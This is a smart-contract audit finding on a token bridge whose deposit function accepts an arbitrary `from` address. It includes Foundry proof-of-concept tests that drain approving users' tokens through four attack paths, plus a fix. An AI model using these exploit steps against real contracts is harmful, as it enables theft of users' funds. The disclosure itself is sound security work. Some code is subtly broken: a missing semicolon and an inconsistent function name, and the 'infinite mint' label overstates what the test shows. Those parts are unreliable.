# Boss Bridge Audit

## Critical

### [C-01] Unrestricted `from` Parameter in `depositTokensTol2` Allows Arbitrary Theft of User Funds Approved to Bridge

**Description**
The `L1BossBridge::depositTokensTol2` function takes an unvalidated `from` parameter and calls `token.safeTransferFrom(from, address(vault), amount)` directly without enforcing that `msg.sender == from` or verifying that `msg.sender` has explicit authorization/allowance from `from`.

```javascript
function depositTokensTol2(address from, address l2Recipient, uint256 amount) external whenNotPaused{
    ...
    token.safeTransferFrom(from, address(vault), amount); // 🚨Anyone can specify any `from` address 
    emit Deposit(from, l2Recipient, amount);
}
```

Standard ERC20 `transferFrom` implementations check if `msg.sender` has an allowance from `from`. However, because the caller is `L1BossBridge`, and users approve the `L1BossBridge` contract directly to spend their tokens on bridge deposits, `safeTransferFrom` executes successfully using the bridge's own allowance--completely bypassing calkler verification.

**Impact**
An attacker can monitor the blockchain for any user approvals given to `L1BossBridge` and systematically drain the entire token balances of all approving users.

Exploitation vectors include:

1. ***Directly Approver Balance Theft:***
   Any user who grants an ERC20 `approve(address(l1Bossbridge), type(uint256).max)` or approves an amount greater than zero can have their entire wallet balance transferred into the bridge vault by an attacker specifying the victim's address as `from` and the attacker's address as `l2Recipient`.
2. ***Infinite L2 Mint/Double Dip:***
   The attacker steals the victim's L1 tokens, deposits them into the bridge vault under their own name, triggers L2 minting of bridge tokens for themselves (`l2Recipient`), and later withdraws those tokens back to L1--effectively stealing victim tokens while simultaneously acquiring valid L2 bridge claims.

3. ***Mempool Front-Running/MEV Sniping:***
   An attacker can run a mempool bot that detects pending `approve` transactions targeting `L1BossBridge`. As soon as the victim's approval transaction lands on-chain, the bot front-runs or back-runs the victim's intended deposit, calling `depositTokensTol2(victim, attacker, victimBalance)` to siphon the victim's tokens first.

4. ***Vault & User Liquidity Exhaustion:***
   By sweeping all approved user tokens directly into the vault under the attacker's L2 account, the attacker gains ownership of the bridge's vault collateral, leaving legitimate depositors unable to withdraw or back their L2 bridge assets.

**Proof of Concept**
Add the following tests directly to test/L1TokenBridge.t.sol to prove all four attack vectors to bug triagers:

```javascript
/* ========================================================================= */
/*                              PROOF OF CONCEPT                             */
/* ========================================================================= */

contract AttackVectorPoCTests is L1BossBridgeTest {
    address attacker = makeAddr("attacker");
    address attackerInL2 = makeAddr("attackerInL2");

    /**
     * @notice Attack Vector 1: Direct Approver Balance Theft
     * @dev An attacker calls depositTokensToL2 specifying a victim who approved the bridge.
     *      The victim's tokens are pulled without their consent.
     */
    function test_poc_attackVector1_directApproverBalanceTheft() public {
        uint256 victimBalance = token.balanceOf(user);

        // Victim approves the bridge for bridging operations (e.g., unlimited approval)
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        assertEq(token.balanceOf(user), victimBalance);
        assertEq(token.balanceOf(address(vault)), 0);

        // Attacker observes user's approval and drains their entire balance
        vm.prank(attacker);
        tokenBridge.depositTokensToL2(user, attackerInL2, victimBalance);

        // Victim is completely drained; vault holds the stolen funds
        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(address(vault)), victimBalance);
    }

    /**
     * @notice Attack Vector 2: Infinite L2 Mint / Double Dip
     * @dev The attacker uses victim funds to trigger a valid Deposit event crediting 
     *      attackerInL2. The off-chain relayer will mint L2 tokens to the attacker.
     */
    function test_poc_attackVector2_unbackedL2MintForAttacker() public {
        uint256 stolenAmount = 500e18;

        // Victim approves bridge
        vm.prank(user);
        token.approve(address(tokenBridge), stolenAmount);

        // Attacker triggers deposit using victim's address as 'from' and attackerInL2 as 'l2Recipient'
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attackerInL2, stolenAmount);

        vm.prank(attacker);
        tokenBridge.depositTokensToL2(user, attackerInL2, stolenAmount);

        // Attacker has successfully routed L2 minting credits to themselves using victim's tokens
        assertEq(token.balanceOf(user), 1000e18 - stolenAmount);
        assertEq(token.balanceOf(address(vault)), stolenAmount);
    }

    /**
     * @notice Attack Vector 3: Mempool Front-Running / MEV Sniping
     * @dev Victim submits approval and deposit. Attacker detects approval in mempool 
     *      and front-runs victim's deposit call, causing victim's transaction to fail.
     */
    function test_poc_attackVector3_mempoolFrontRunning() public {
        uint256 depositAmount = 100e18;

        // Step 1: Victim approves tokens on L1 (Transaction 1)
        vm.prank(user);
        token.approve(address(tokenBridge), depositAmount);

        // Step 2: Attacker spots victim's approval in mempool and front-runs victim's deposit (Transaction 2a)
        vm.prank(attacker);
        tokenBridge.depositTokensToL2(user, attackerInL2, depositAmount);

        // Step 3: Victim's original deposit transaction executes next and reverts due to exhausted allowance (Transaction 2b)
        vm.prank(user);
        vm.expectRevert();
        tokenBridge.depositTokensToL2(user, userInL2, depositAmount);
    }

    /**
     * @notice Attack Vector 4: Vault & User Liquidity Exhaustion
     * @dev Attacker iterates over multiple approved users and sweeps all liquidity into vault 
     *      under attacker-controlled L2 recipients, monopolizing vault claims.
     */
    function test_poc_attackVector4_vaultAndLiquidityExhaustion() public {
        address victim2 = makeAddr("victim2");

        // Mint/deal tokens directly to victim2
        deal(address(token), victim2, 500e18);

        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        vm.prank(victim2);
        token.approve(address(tokenBridge), type(uint256).max);

        vm.startPrank(attacker);
        tokenBridge.depositTokensToL2(user, attackerInL2, token.balanceOf(user));
        tokenBridge.depositTokensToL2(victim2, attackerInL2, token.balanceOf(victim2))
        vm.stopPrank();

        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(victim2), 0);
        assertEq(token.balanceOf(address(vault)), 1500e18);
    }
}
```

**Recommended Mitigation**
Enforce that tokens are transfered strictly from `msg.sender`, removing the unvalidated `from` parameter entirely:

```diff
- function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+ function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
      ...
-     token.safeTransferFrom(from, address(vault), amount);
+     token.safeTransferFrom(msg.sender, address(vault), amount);
-     emit Deposit(from, l2Recipient, amount);
+     emit Deposit(msg.sender, l2Recipient, amount);
  }
```
